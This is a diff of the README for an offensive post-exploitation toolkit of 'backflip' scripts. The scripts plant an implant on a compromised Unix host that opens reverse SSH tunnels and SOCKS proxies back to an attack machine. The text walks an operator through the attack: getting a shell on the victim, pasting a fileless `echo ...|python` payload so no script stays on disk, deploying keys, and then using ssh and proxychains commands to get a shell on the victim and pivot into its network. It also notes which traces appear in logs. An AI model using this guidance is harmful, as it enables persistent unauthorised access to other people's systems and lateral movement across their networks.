@@ -1,9 +1,9 @@
 # WTF
 
 These are backflip scripts used to create ssh backflips. This allows
-for a connection outbound from a unix system to an attack machine that
-provides a reverse tunnel back into that machine's ssh server. It
-deploys keys to make this all possible.
+for a connection outbound from a compromised unix system to an attack
+machine that provides a reverse tunnel back into the attack machine's
+ssh server. It deploys keys to make this all possible.
 
 # Things to Take Note of
 * Port numbers for both reverse port forwards and socks proxies will
@@ -14,32 +14,45 @@ deploys keys to make this all possible.
   will work, one should be aware of this caveat.
 
 
-# Moving Parts
-## `implant.py`
-embedded in install_implant.py that daemonizes and makes ssh
+# Components
+The structure here is a little confusing at first. Because we don't
+want to leave a script file on disk, we give cut-n-paste commands that
+are of the form `echo xxx|python`. The cut-n-paste command is
+generated from the scripts that are indirectly run. This is important
+for the operator to understand what these scripts do on target, but
+the the scripts the operator directly uses are `make_backflip.py` and
+`install_proxy.py`
+
+## Components Directly Run
+
+### `make_backflip.py`
+runs on the attack machine that gives the cut-n-paste command to
+run on victim
+
+### `install_proxy.py`
+runs on attack machine and installs and starts a socks proxy into victim network
+
+## Components Indirectly Run
+
+### `implant.py`
+embedded in `install_implant.py` that daemonizes and makes ssh
 connections. Note that the current implementation uses
 `subprocess.Popen` with `shell=True`, which will cause an `execve`
 with `sh -c` to appear in logs.
 
-## `install_implant.py`
-runs on client that provisions the keys and runs evil.py
-
-## `make_backflip.py`
-runs on the attack machine that gives the cut-n-paste command to
-run on victim
-
-## `install_proxy.py`
-installs and start a socks proxy back to victim
+### `install_implant.py`
+template of script that will be encoded and outputed as the
+cut-n-paste command by `make_backflip.py`
 
 # How to Setup a Backflip
 
 In our examples, our victim is 10.0.0.1 and our proxy01 external IP is
-at 10.50.0.1. We our reverse port-forwards are on ports 4000 onwards
-and our socks proxies are on ports 5000 onwards
+at 10.50.0.1. We setup our reverse port-forwards are on ports 4000
+onwards and our socks proxies are on ports 5000 onwards
 
 1. Get a shell on victim host
 
-1. run `make_backflip.py`
+1. run `make_backflip.py` on the attack host
 
 	The invocation is `make_backflip.py <user> <victim-ip> <attacker-ip> <reverse listen port>`.
 	Assuming the victim username is ubuntu, attack and victim ip given
@@ -109,7 +122,7 @@ There are two primary ways to use a backflip: shell access and proxy access.
 
 ## Get a Shell
 
-In `/opt/backflips/keys` are the ssh keypairs necessary to ssh into
+`/opt/backflips/keys` contains the necessary  ssh keypairs to ssh into
 the victim machine. However, the permissions on the directory are such
 that a normal user cannot use them. Each key to be used must be copied
 to your home directory with permissions and ownership as SSH
@@ -120,8 +133,8 @@ sudo chown $UID:$(id -g) ~/.ssh/ubuntu-10.0.0.1-10.50.0.1
 chmod 600 ~/.ssh/ubuntu-10.0.0.1-10.50.0.1
 ```
 
-Note, the user will be the same user as used above
-to setup the backflip.
+Note, the user will be the same user as used above to setup the
+backflip.
 
 The following will reward you with a shell on the victim:
 ```
@@ -133,7 +146,8 @@ ssh -i ~/.ssh/ubuntu-10.0.0.1-10.50.0.1 -p 4000 ubuntu@127.0.0.1
 In our example above, there is a SOCKS5 proxy running on
 port 5000. The most practical way to use it is with a browser plugin
 such as foxyproxy or switchyomega. However, it is also available for
-command line tools with the help of a proxy LD_PRELOAD library.
+command line tools with the help of a proxy LD_PRELOAD library such as
+`proxychains` or `tsocks`.
 
 For example, a `proxychains.conf` in the current working directory
 with contents as such:
